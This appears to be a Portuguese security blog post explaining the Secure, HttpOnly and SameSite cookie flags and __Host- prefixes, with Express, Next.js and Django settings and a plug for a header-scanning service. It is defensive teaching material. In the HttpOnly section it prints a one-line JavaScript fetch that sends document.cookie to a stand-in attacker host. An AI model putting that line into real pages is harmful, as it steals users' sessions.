---
title: "Cookies Secure, HttpOnly e SameSite: o que são e por que faltam no seu site"
description: "Entenda as flags Secure, HttpOnly e SameSite de cookie, por que elas faltam no seu site e como blindar o cookie de sessão contra XSS e CSRF."
slug: "cookies-secure-httponly-samesite"
date: "2026-06-30"
updated: "2026-06-30"
author: "Anderson Gadelha"
tags: ["cookies", "sessão", "owasp"]
keyword: "cookie httponly secure samesite"
---

Quase todo SaaS guarda a sessão do usuário num cookie. E quase todo SaaS deixa esse cookie mais exposto do que deveria, porque o framework veio com um default fraco e ninguém olhou de novo. As flags `Secure`, `HttpOnly` e `SameSite` são três atributos de uma única linha de cabeçalho HTTP. Não custam nada, não quebram nada quando bem configuradas e são a diferença entre um XSS que rouba a sessão de todo mundo e um XSS chato porém contido. Este artigo é prático: a sintaxe real, o que cada flag protege, por que faltam e como conferir as suas.

## A anatomia de um Set-Cookie

O servidor cria um cookie mandando um cabeçalho `Set-Cookie` na resposta HTTP. O navegador guarda e, dali em diante, devolve o valor em cada requisição para aquele domínio. A sintaxe é definida pela RFC 6265:

```http
Set-Cookie: session=abc123; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=3600
```

Os atributos vêm depois do par `nome=valor`, separados por `; `. O que nos interessa aqui são três deles: `Secure`, `HttpOnly` e `SameSite`. Os dois primeiros são flags booleanas — estão presentes ou não. O terceiro recebe um valor. Cada um fecha uma porta diferente.

## HttpOnly: tira o cookie do alcance do JavaScript

Por padrão, qualquer script rodando na página lê os cookies via `document.cookie`. Isso significa que um único XSS — um campo que reflete HTML não escapado, uma dependência comprometida, um comentário malicioso renderizado — consegue ler o cookie de sessão e mandá-lo para um servidor do atacante. Sessão roubada, login sequestrado, sem precisar de senha.

A flag `HttpOnly` corta isso. Com ela, o cookie continua sendo enviado em toda requisição HTTP, mas some de `document.cookie`. O JavaScript simplesmente não enxerga.

```js
// Sem HttpOnly, isto entrega a sessão para o atacante:
fetch('https://evil.example/steal?c=' + document.cookie)
// Com HttpOnly, document.cookie não contém o cookie de sessão.
```

`HttpOnly` não impede o XSS — impede que o XSS vire roubo de sessão. É mitigação de impacto, e por isso a OWASP a trata como obrigatória para qualquer cookie de autenticação. A regra é simples: **se o JavaScript do seu front-end não precisa ler o cookie, ele deve ser `HttpOnly`.** Cookies de sessão nunca precisam ser lidos pelo JS.

## Secure: nunca trafegar em texto claro

A flag `Secure` instrui o navegador a só enviar o cookie em conexões HTTPS. Sem ela, um cookie de sessão pode vazar em qualquer requisição HTTP — um link `http://`, um redirect mal configurado, uma rede Wi-Fi hostil capturando o tráfego em texto claro.

```http
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Lax
```

Em produção, sob HTTPS, não há motivo para um cookie sensível não ter `Secure`. O único lugar onde ela atrapalha é o `localhost` em HTTP durante o desenvolvimento — e a solução certa é condicionar a flag ao ambiente, não removê-la de vez.

## SameSite: a defesa de primeira linha contra CSRF

`SameSite` controla se o cookie é enviado em requisições que partem de **outros sites**. É a peça que reduz CSRF (Cross-Site Request Forgery), o ataque em que uma página maliciosa dispara uma requisição para o seu site aproveitando que o navegador anexa os cookies automaticamente. Três valores:

- **`Strict`** — o cookie nunca acompanha requisições vindas de outro site. Defesa máxima. Efeito colateral: se o usuário chega ao seu app por um link externo, ele aparece deslogado na primeira navegação, porque o cookie não viajou.
- **`Lax`** — o padrão sensato. O cookie acompanha navegações de topo (clicar num link), mas não requisições disparadas em segundo plano por outro site (um `POST` via formulário escondido, uma imagem, um `fetch` cross-site). Cobre a maioria dos casos de CSRF sem quebrar a experiência.
- **`None`** — o cookie viaja em todo contexto cross-site. Necessário para fluxos legítimos entre domínios (SSO, iframes, certas integrações). **`None` exige `Secure`** — o navegador rejeita `SameSite=None` sem `Secure`.

Se você não declara `SameSite`, os navegadores modernos assumem `Lax`. Isso ajuda, mas confiar no default implícito é frágil: deixe explícito.

```http
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Lax
```

`SameSite` reduz a superfície de CSRF, mas não substitui um token anti-CSRF para operações sensíveis. As duas defesas se somam.

## Por que tantos frameworks deixam o default fraco

Porque o default seguro às vezes quebra o desenvolvimento local. `Secure` impede o cookie de funcionar em `http://localhost`. Frameworks priorizam a primeira execução sem atrito, então entregam cookies sem `Secure` e sem `HttpOnly`, contando que você endureça antes de subir para produção. Quase ninguém endurece. O resultado é cookie de sessão nu em produção — e ninguém percebe porque o app funciona perfeitamente assim.

É exatamente o tipo de configuração ausente que o scanner do Fracta lê do cabeçalho de resposta do seu site e devolve numa nota A–F, sem você precisar abrir o DevTools. Cookie sem `HttpOnly` num endpoint de login derruba a nota na hora.

### Tabela de referência

| Flag | Protege contra | Quando usar |
|------|----------------|-------------|
| `HttpOnly` | Roubo de sessão via XSS (`document.cookie`) | Todo cookie que o JS não precisa ler — sessão, auth |
| `Secure` | Vazamento em HTTP/texto claro (sniffing) | Todo cookie sensível em produção (sempre sob HTTPS) |
| `SameSite=Lax` | CSRF, mantendo navegação por link | Padrão para cookies de sessão na maioria dos apps |
| `SameSite=Strict` | CSRF de forma mais agressiva | Áreas de alto risco (banking, painel admin) |
| `SameSite=None` | (não protege — habilita cross-site) | Só fluxos cross-site legítimos; **exige `Secure`** |

## Os prefixes __Host- e __Secure-

A RFC define dois prefixes no **nome** do cookie que o navegador trata como contrato e recusa se as condições não baterem:

- **`__Secure-`** — o navegador só aceita o cookie se ele tiver a flag `Secure` e vier por HTTPS.
- **`__Host-`** — mais rígido: exige `Secure`, exige `Path=/`, e **proíbe** o atributo `Domain`. Isso trava o cookie no host exato que o emitiu, impedindo que um subdomínio comprometido sobrescreva o cookie do domínio principal (cookie tossing).

```http
Set-Cookie: __Host-session=abc123; Path=/; Secure; HttpOnly; SameSite=Lax
```

Para cookies de sessão de alto valor, `__Host-` é o padrão-ouro. Custa renomear um cookie.

## O equívoco do cookie de terceiro (e a ponte com a LGPD)

Uma confusão comum: "o scanner reclamou de um cookie de analytics que nem é meu, então é falso positivo." Não é. Se o cookie é setado num domínio que **você** controla — mesmo que o script seja do Google Analytics, de um chat de suporte ou de um pixel de anúncio — ele aparece nas suas respostas e é responsabilidade sua configurar e divulgar.

E aqui a engenharia encosta no jurídico. Pela LGPD, cookies que rastreiam comportamento (analytics, marketing) tratam dados pessoais e, na maioria dos casos, dependem de **consentimento** — coletado antes de o cookie ser gravado, com opção real de recusa. Carregar o script de analytics no primeiro acesso, antes do banner, é gravar cookie sem base legal. As flags técnicas e o consentimento são problemas distintos, mas moram no mesmo `Set-Cookie`: um inspeção honesta dos seus cookies revela os dois de uma vez.

## Como inspecionar os cookies do seu site

**No navegador (DevTools).** Abra o site, pressione F12, vá em **Application** (Chrome) ou **Storage** (Firefox) → **Cookies**. A tabela mostra colunas `HttpOnly`, `Secure` e `SameSite` para cada cookie. Procure os cookies de sessão e confira se as três estão preenchidas.

**No terminal (curl).** Para ver o cabeçalho cru, sem interpretação:

```bash
curl -sI https://seusite.com.br | grep -i set-cookie
```

Você verá a linha `Set-Cookie` exatamente como o servidor enviou — incluindo ou faltando cada flag.

### Exemplos: bom vs ruim

```http
# RUIM — sessão exposta a XSS, a sniffing e a CSRF
Set-Cookie: session=abc123; Path=/

# BOM — cookie de sessão blindado
Set-Cookie: __Host-session=abc123; Path=/; Secure; HttpOnly; SameSite=Lax
```

### Configuração nos frameworks comuns

```js
// Express com cookie-parser / res.cookie
res.cookie('session', token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'lax',
  path: '/',
})
```

```js
// Next.js — Route Handler / Server Action
import { cookies } from 'next/headers'

cookies().set('session', token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'lax',
  path: '/',
})
```

```python
# Django — settings.py
SESSION_COOKIE_HTTPONLY = True   # já é o default; não desligue
SESSION_COOKIE_SECURE = True     # produção sob HTTPS
SESSION_COOKIE_SAMESITE = "Lax"  # default; "Strict" para áreas críticas
CSRF_COOKIE_SECURE = True
```

O denominador comum: `secure` condicionado ao ambiente (ligado em produção), `httpOnly` sempre ligado em cookie de sessão, `sameSite` explícito.

## Fechando

Três flags numa linha de cabeçalho. `HttpOnly` contém o estrago de um XSS. `Secure` mantém o cookie longe de texto claro. `SameSite` corta a superfície de CSRF. Nenhuma delas exige refatoração — só uma decisão consciente em vez do default que veio de fábrica. A maioria dos sites passa anos com o cookie de sessão nu sem ninguém notar, porque o app funciona igual de qualquer jeito.

A pergunta certa não é "será que está configurado?" — é "vamos olhar." Cole a URL do seu site e **veja as flags dos seus cookies de graça no [fracta.pro](https://fracta.pro)**: nota A–F na hora, sem cadastro, com cada `Set-Cookie` lido direto do seu cabeçalho de resposta.
